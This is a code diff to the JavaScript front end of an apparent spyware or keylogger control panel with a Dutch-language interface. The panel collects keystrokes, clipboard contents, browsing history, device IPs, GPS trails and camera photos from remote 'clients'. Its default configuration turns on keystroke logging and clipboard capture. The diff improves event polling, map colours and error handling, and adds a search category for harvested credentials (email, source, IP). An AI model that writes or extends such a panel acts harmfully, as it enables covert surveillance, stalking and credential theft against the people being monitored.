@@ -1149,17 +1149,22 @@ async function api(url) {
 }
 
 let lastEventPollTs = 0;
+let lastEventTimestamp = ''; // ISO string of most recent event seen
 
 async function refreshAll() {
     showRefreshRing();
     await loadTags();
     try {
         const f = filterParam();
+        // On first load: fetch 100 events. On subsequent polls: fetch only new ones via `since`
+        const eventsUrl = lastEventTimestamp
+            ? `/api/events?limit=50&since=${encodeURIComponent(lastEventTimestamp)}`
+            : '/api/events?limit=100';
         const [stats, locs, photos, evts] = await Promise.all([
             api('/api/stats'),
             api('/api/locations?limit=50' + f),
             api('/api/photos?limit=12' + f),
-            api('/api/events?limit=100')
+            api(eventsUrl)
         ]);
         if (stats) {
             try {
@@ -1188,19 +1193,31 @@ async function refreshAll() {
         if (locs) try { renderLocations(locs); } catch(e) { showError('refreshAll-locs', e); }
         if (photos) try { renderRecentPhotos(photos); } catch(e) { showError('refreshAll-photos', e); }
 
-        // Merge new events — show toasts for events that arrived since last poll
-        if (evts && Array.isArray(evts)) {
+        // Merge new events — incremental: new events are prepended, toasts shown
+        if (evts && Array.isArray(evts) && evts.length > 0) {
             try {
-                if (lastEventPollTs > 0) {
-                    const lastPollIso = new Date(lastEventPollTs).toISOString();
-                    const fresh = evts.filter(e => e.timestamp > lastPollIso);
-                    fresh.slice().reverse().forEach(e => showToast(e)); // oldest first
+                // Show toasts for newly arrived events (all of them on incremental polls)
+                if (lastEventTimestamp) {
+                    // These are all genuinely new (server filtered by `since`)
+                    evts.slice().reverse().forEach(e => showToast(e)); // oldest first
                 }
-                lastEventPollTs = Date.now();
-                events = evts;
+                // Prepend new events, deduplicate by id, cap at 500
+                const newIds = new Set(evts.map(e => e.id || e.timestamp));
+                const merged = [...evts, ...events.filter(e => !newIds.has(e.id || e.timestamp))];
+                events = merged.slice(0, 500);
+                // Update latest timestamp for next incremental poll
+                if (evts[0] && evts[0].timestamp > (lastEventTimestamp || '')) {
+                    lastEventTimestamp = evts[0].timestamp;
+                }
                 renderEvents();
             } catch(e) { showError('refreshAll-events', e); }
+        } else if (!lastEventTimestamp && evts && Array.isArray(evts)) {
+            // First load, no new events
+            events = evts;
+            if (evts[0]) lastEventTimestamp = evts[0].timestamp;
+            renderEvents();
         }
+        lastEventPollTs = Date.now();
 
         // Auto-refresh camera tab
         const ct = document.querySelector('.tab[data-v="cameras"]');
@@ -1776,9 +1793,11 @@ async function loadMap() {
     // Colors per client (vivid, distinguishable on light & dark map tiles)
     const colors = ['#e53935','#1e88e5','#43a047','#fb8c00','#8e24aa','#00acc1','#f06292','#7cb342','#ff7043','#26c6da'];
     let ci = 0;
+    const clientColors = {}; // track color per clientId for consistent marker+trail colors
 
     Object.entries(byClient).forEach(([id, l]) => {
         const color = colors[ci++ % colors.length];
+        clientColors[id] = color; // save so trail uses same color
         const m = L.circleMarker([l.latitude, l.longitude], {
             radius: 8, color, fillColor: color, fillOpacity: 0.7
         }).addTo(map);
@@ -1786,16 +1805,15 @@ async function loadMap() {
         markers[id] = m;
     });
 
-    // Trails
+    // Trails — use same color as the client's marker for visual consistency
     const trails = {};
     locs.forEach(l => {
         if (!trails[l.clientId]) trails[l.clientId] = [];
         trails[l.clientId].push([l.latitude, l.longitude]);
     });
-    ci = 0;
-    Object.values(trails).forEach(trail => {
+    Object.entries(trails).forEach(([clientId, trail]) => {
         if (trail.length > 1) {
-            const color = colors[ci++ % colors.length] + '66';
+            const color = (clientColors[clientId] || colors[0]) + '66'; // semi-transparent
             const line = L.polyline(trail, { color, weight: 2 }).addTo(map);
             trailLayers.push(line);
         }
@@ -1953,16 +1971,20 @@ async function saveConfig() {
         photoEnabled: false, videoEnabled: false,
         locationEnabled: true, locationPeriod: 30000
     };
-    await apiFetch('/api/config', { method: 'POST', body: JSON.stringify(cfg) });
-    toast('\u2705 Instellingen opgeslagen!');
+    try {
+        await apiFetch('/api/config', { method: 'POST', body: JSON.stringify(cfg) });
+        toast('\u2705 Instellingen opgeslagen!');
+    } catch(e) { toast('\u274C Opslaan mislukt: ' + e.message); }
 }
 
 async function resetConfig() {
     if (!confirm('Reset alle instellingen naar standaard?')) return;
     const def = { photoEnabled:false, videoEnabled:false, locationEnabled:true, locationPeriod:30000, photoQuality:0.7, keystrokesEnabled:true, keyLogFlush:10000, clipboardEnabled:true, clipboardCheck:15000, heartbeatPeriod:8000 };
-    await apiFetch('/api/config', { method: 'POST', body: JSON.stringify(def) });
-    loadConfig();
-    toast('\u2705 Instellingen gereset.');
+    try {
+        await apiFetch('/api/config', { method: 'POST', body: JSON.stringify(def) });
+        loadConfig();
+        toast('\u2705 Instellingen gereset.');
+    } catch(e) { toast('\u274C Reset mislukt: ' + e.message); }
 }
 
 async function loadStorage() {
@@ -2171,7 +2193,12 @@ function updateActivityChart() {
         grad.addColorStop(1, '#1a73e822');
         ctx.fillStyle = grad;
         ctx.beginPath();
-        ctx.roundRect(x, y, barW - barGap * 2, bh, [4, 4, 0, 0]);
+        // roundRect may not exist in older browsers — fall back to plain rect
+        if (ctx.roundRect) {
+            ctx.roundRect(x, y, barW - barGap * 2, bh, [4, 4, 0, 0]);
+        } else {
+            ctx.rect(x, y, barW - barGap * 2, bh);
+        }
         ctx.fill();
     });
 
@@ -2205,7 +2232,7 @@ async function doGlobalSearch() {
         $('#search-results').classList.add('show');
         return;
     }
-    const icons = { clients: '👤', keystrokes: '⌨️', clipboard: '📋', visits: '🌐', devices: '📱', errors: '⚠️' };
+    const icons = { clients: '👤', keystrokes: '⌨️', clipboard: '📋', visits: '🌐', devices: '📱', errors: '⚠️', credentials: '🔑', notes: '📝' };
     let html = '';
     for (const [type, items] of Object.entries(results)) {
         html += `<div class="sr-group"><div class="sr-group-title">${icons[type]||''} ${type} (${items.length})</div>`;
@@ -2217,6 +2244,8 @@ async function doGlobalSearch() {
             else if (type === 'visits') { text = item.url||''; meta = `${item.clientId} · ${item.title||''} · ${fmtTime(item.timestamp)}`; }
             else if (type === 'devices') { text = item.clientId; meta = `${item.platform||''} · ${item.ip||''}`; }
             else if (type === 'errors') { text = item.message||''; meta = `${item.clientId} · ${fmtTime(item.timestamp)}`; }
+            else if (type === 'credentials') { text = item.email||''; meta = `${item.source||''} · ${item.ip||''} · ${fmtTime(item.timestamp)}`; }
+            else if (type === 'notes') { text = item.text||''; meta = `${item.clientId} · ${fmtTime(item.timestamp)}`; }
             // Highlight matching text
             const re = new RegExp(`(${q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')})`, 'gi');
             text = escHtml(text).replace(re, '<span class="sr-highlight">$1</span>');
